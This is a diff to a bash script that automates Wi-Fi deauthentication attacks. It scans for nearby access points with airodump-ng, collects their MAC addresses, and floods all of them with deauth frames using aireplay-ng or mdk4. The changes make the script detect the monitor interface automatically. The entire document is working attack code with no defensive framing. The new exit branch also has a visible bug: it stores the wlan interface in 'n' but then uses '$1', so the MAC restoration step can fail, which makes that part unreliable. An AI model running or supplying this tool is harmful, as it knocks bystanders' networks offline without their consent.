@@ -1,5 +1,6 @@
 #!/bin/bash
 path=$(pwd)
+c=$(ifconfig | grep mon | awk '{print $1}' | tr -d :)
 RED="\e[31m"
 GREEN="\e[32m"
 YELLOW="\e[33m"
@@ -33,12 +34,11 @@ echo -e "${BLUE}[*] ${YELLOW}Scanning now for Access Points..."
 sleep 1
 echo -e "${BLUE}[*] ${YELLOW}Scanning in background for hosts.."
 echo -e "${BLUE}[*] ${YELLOW}Press ${RED}CTRL+C ${YELLOW}to stop scan."
-airodump-ng wlan0mon >> aps.txt
+airodump-ng $c >> aps.txt
 FILE='aps.txt'
 sleep 0.5
 echo -ne "${BLUE}[*] ${YELLOW}Successfully grabbed access points. Deauth ${CYAN}A${YELLOW}ll or ${CYAN}E${YELLOW}xit${CYAN}[A/E]?: "
 read exc
-
 if [[ $exc == "A" || $exc == "a" ]]
 then
 	if [ -f $FILE ]
@@ -54,7 +54,7 @@ then
 	if [ -f $FILE2 ]
 	then
 		sleep 1
-		echo -e "${BLUE}[*] ${YELLOW}Succefully extracted all mac addresses to: ${GREEN}$path/$FILE2"
+		echo -e "${BLUE}[*] ${YELLOW}Successfully extracted all mac addresses to: ${GREEN}$path/$FILE2"
 	else
 		echo -e "${RED}[!] ${YELLOW}No file found, please re-run script or check ${RED}$path$FILE2"
 		sleep 1
@@ -82,22 +82,26 @@ then
 	then
 		echo -e "${BLUE}[*] ${YELLOW}Trying to attack with aireplay...."
 		sleep 1
-		while read -r line; do aireplay-ng --deauth $count -a $line --ignore-negative-one wlan0mon; done < endresult.txt
+		while read -r line; do aireplay-ng --deauth $count -a $line --ignore-negative-one $c; done < endresult.txt
+		read -p "[*] Press [Enter] to exit"
+		rm *.txt	
 	else
 		echo -e "${BLUE}[*] ${YELLOW}Trying to use MDK4 method..."
 		sleep 1
-		mdk4 wlan0mon d -w $path/endresult.txt -x 10 -c h
+		mdk4 $c d -w $path/endresult.txt -x 10 -c h
+		read -p "[*] Press [Enter] to exit"
+		rm *.txt
 	fi
 else
 	sleep 0.5
 	echo -e "${RED}[!] ${MAGENTA}Leaving..."
 	echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
-	airmon-ng stop wlan0mon 2>$path/error.log
+	airmon-ng stop $c 2>$path/error.log
 	rm *.txt
 	echo -e "${BLUE}[*] ${YELLOW}Restoring original mac..."
-	ifconfig wlan0 down
-	macchanger -p wlan0 2>$path/error.log
-	ifconfig wlan0 up
+	n=$(ifconfig | grep wlan | awk '{print $1}' | tr -d :)
+	ifconfig $1 down
+	macchanger -p $1 2>$path/error.log
+	ifconfig $1 up
 	service network-manager restart
 fi
-#rm *.txt
